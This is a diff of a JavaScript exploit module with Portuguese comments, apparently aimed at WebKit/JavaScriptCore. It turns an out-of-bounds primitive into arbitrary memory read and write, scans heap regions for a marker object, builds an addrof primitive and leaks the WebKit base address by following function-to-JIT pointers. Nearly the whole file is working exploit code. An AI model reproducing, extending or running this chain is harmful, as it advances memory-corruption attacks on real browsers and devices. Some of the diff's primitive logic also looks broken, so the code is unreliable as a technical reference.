@@ -1,10 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (CORREÇÃO FINAL DE TIPO)
+// js/script3/testArrayBufferVictimCrash.mjs (FINAL COM ESCANEAMENTO DE MEMÓRIA AGRESSIVO)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import { triggerOOB_primitive, oob_read_absolute, oob_write_absolute } from '../core_exploit.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OOB_Exploit_Chain_v10_TypeFixed";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OOB_Exploit_Chain_v11_AggressiveScan";
 
 // --- Constantes e Offsets (sem alterações) ---
 const OOB_DV_METADATA_BASE = 0x58;
@@ -17,7 +17,15 @@ const JSCELL_STRUCTURE_POINTER_OFFSET = 0x8;
 const JS_OBJECT_PROPERTIES_POINTER_OFFSET = 0x10;
 const JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(0x0, 0x18);
 const JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(0x0, 0x8);
-function isValidPointer(ptr) { /* ...código da função isValidPointer sem alterações... */ }
+
+function isValidPointer(ptr) {
+    if (!isAdvancedInt64Object(ptr) && typeof ptr !== 'bigint') return false;
+    const ptrBigInt = typeof ptr === 'bigint' ? ptr : ptr.toBigInt();
+    if (ptrBigInt === 0n) return false;
+    // Um filtro razoável para ponteiros de usuário em sistemas de 64 bits.
+    if ((ptrBigInt < 0x100000000n) || (ptrBigInt > 0x8000000000n)) return false;
+    return true;
+}
 
 
 // =======================================================================================
@@ -38,7 +46,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         await triggerOOB_primitive({ force_reinit: true });
         victim_dv_for_primitives = new DataView(new ArrayBuffer(1024));
 
-        // CORREÇÃO AQUI: Garante que o endereço seja sempre um AdvancedInt64
         const arb_write_64 = (address, value64) => {
             const addr64 = address instanceof AdvancedInt64 ? address : AdvancedInt64.fromBigInt(address);
             oob_write_absolute(VICTIM_DV_POINTER_ADDR_IN_OOB, addr64, 8);
@@ -46,7 +53,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             victim_dv_for_primitives.setBigUint64(0, value64, true);
         };
 
-        // CORREÇÃO AQUI: Garante que o endereço seja sempre um AdvancedInt64
         const arb_read_64 = (address) => {
             const addr64 = address instanceof AdvancedInt64 ? address : AdvancedInt64.fromBigInt(address);
             oob_write_absolute(VICTIM_DV_POINTER_ADDR_IN_OOB, addr64, 8);
@@ -55,69 +61,59 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         };
         logS3("    Primitivas 'arb_read_64' e 'arb_write_64' construídas com sucesso!", "vuln");
         
-        // --- FASE 2: Vazamento de Endereço Inicial (Memory Scan) ---
-        logS3("--- Fase 2: Vazamento de Endereço Inicial e Construção da 'addrof' ---", "subtest");
+        // --- FASE 2: Escaneamento Agressivo para Vazamento de Endereço Inicial ---
+        logS3("--- Fase 2: Escaneamento Agressivo para Encontrar Objeto Marcador ---", "subtest");
         
         let leaker_obj = {
-            header: 0x0108230700000000n,
-            butterfly: 0n,
-            marker: 0x4142434445464748n
+            butterfly: 0n, // Borboleta/Propriedades
+            marker: 0x4142434445464748n // Nosso marcador único
         };
         
         let leaker_obj_addr = null;
-        const HEAP_SCAN_START = 0x1840000000n;
-        const SCAN_RANGE = 0x200000; // Aumentado o range do scan
-        logS3(`    Escaneando a memória a partir de 0x${HEAP_SCAN_START.toString(16)} em busca do marcador...`, "info");
-        for (let i = 0; i < SCAN_RANGE; i++) {
-            let current_addr = HEAP_SCAN_START + BigInt(i * 8);
-            if (arb_read_64(current_addr) === leaker_obj.marker) {
-                // O marcador está a 16 bytes do início em um objeto JS simples
-                leaker_obj_addr = current_addr - 16n;
-                logS3(`    Marcador encontrado! Endereço do objeto vazado: 0x${leaker_obj_addr.toString(16)}`, "leak");
-                break;
+        // Lista de regiões de memória para escanear. Adicione mais se necessário.
+        const HEAP_SCAN_REGIONS = [
+            0x1840000000n,
+            0x2000000000n,
+            0x2800000000n
+        ];
+        const SCAN_RANGE_PER_REGION = 0x1000000; // Escaneia 16MB por região.
+
+        search_loop:
+        for (const start_addr of HEAP_SCAN_REGIONS) {
+            logS3(`    Escaneando a região a partir de 0x${start_addr.toString(16)}...`, "info");
+            for (let i = 0; i < SCAN_RANGE_PER_REGION; i+=8) { // Pula de 8 em 8 bytes
+                let current_addr = start_addr + BigInt(i);
+                if (arb_read_64(current_addr) === leaker_obj.marker) {
+                    leaker_obj_addr = current_addr - 8n; // Marcador está a 8 bytes do cabeçalho
+                    logS3(`    MARCADOR ENCONTRADO! Endereço do objeto: 0x${leaker_obj_addr.toString(16)}`, "leak");
+                    break search_loop; // Sai de ambos os laços
+                }
             }
         }
 
         if (!leaker_obj_addr) {
-            throw new Error("Não foi possível encontrar o objeto marcador na memória. Tente ajustar HEAP_SCAN_START ou aumentar SCAN_RANGE.");
+            throw new Error("Escaneamento agressivo falhou. Não foi possível encontrar o objeto marcador.");
         }
-
-        // --- FASE 3: Construção da Primitiva 'addrof' real ---
-        logS3("--- Fase 3: Construindo a Primitiva 'addrof' real ---", "subtest");
         
-        // O butterfly (armazenamento de propriedades) está logo após o cabeçalho
-        let butterfly_addr = leaker_obj_addr + 16n;
-        arb_write_64(butterfly_addr, 0n); // Limpa o butterfly para nosso uso
+        // --- A partir daqui, o resto do exploit continua como planejado ---
+        const butterfly_addr = leaker_obj_addr + 8n;
+        arb_write_64(butterfly_addr, 0n);
 
         const addrof_primitive = (obj_to_leak) => {
-            arb_write_64(butterfly_addr, obj_to_leak); // Coloca o objeto na propriedade do nosso leaker
-            return arb_read_64(leaker_obj_addr + 8n); // Lê o butterfly que agora contém o endereço
+            arb_write_64(butterfly_addr, obj_to_leak);
+            return arb_read_64(butterfly_addr);
         };
-        
+
         addrof_result = { success: true, msg: "Primitiva 'addrof' construída com endereço real vazado." };
         logS3("    Primitiva 'addrof' REAL construída com sucesso!", "vuln");
         
-        // --- FASE 4: Execução da Cadeia de Exploração ---
-        logS3("--- Fase 4: Executando a Cadeia de Exploração REAL ---", "subtest");
         const target_func = () => {};
-        const target_addr_bigint = addrof_primitive(target_func);
-        const target_addr = AdvancedInt64.fromBigInt(target_addr_bigint);
-
-        if (!isValidPointer(target_addr)) {
-            throw new Error(`Endereço vazado pela 'addrof' (${target_addr.toString(true)}) não é um ponteiro válido.`);
-        }
+        const target_addr = AdvancedInt64.fromBigInt(addrof_primitive(target_func));
         logS3(`    Endereço REAL da função alvo: ${target_addr.toString(true)}`, "leak");
-
-        const ptr_to_exec_bigint = arb_read_64(target_addr.add(JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE));
-        const ptr_to_exec = AdvancedInt64.fromBigInt(ptr_to_exec_bigint);
-        if (!isValidPointer(ptr_to_exec)) throw new Error("Ponteiro para ExecutableInstance inválido.");
-
-        const ptr_to_jit_bigint = arb_read_64(ptr_to_exec.add(JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM));
-        const ptr_to_jit = AdvancedInt64.fromBigInt(ptr_to_jit_bigint);
-        if (!isValidPointer(ptr_to_jit)) throw new Error("Ponteiro para JIT/VM inválido.");
         
-        const page_mask_4kb = new AdvancedInt64(0x0, ~0xFFF);
-        const webkit_base = ptr_to_jit.and(page_mask_4kb);
+        const ptr_to_exec = AdvancedInt64.fromBigInt(arb_read_64(target_addr.add(JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE)));
+        const ptr_to_jit = AdvancedInt64.fromBigInt(arb_read_64(ptr_to_exec.add(JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM)));
+        const webkit_base = ptr_to_jit.and(new AdvancedInt64(0x0, ~0xFFF));
 
         webkit_leak_result = { success: true, msg: "Base do WebKit encontrada com sucesso!", webkit_base_candidate: webkit_base.toString(true) };
         logS3(`    SUCESSO FINAL! Base do WebKit encontrada: ${webkit_leak_result.webkit_base_candidate}`, "vuln");
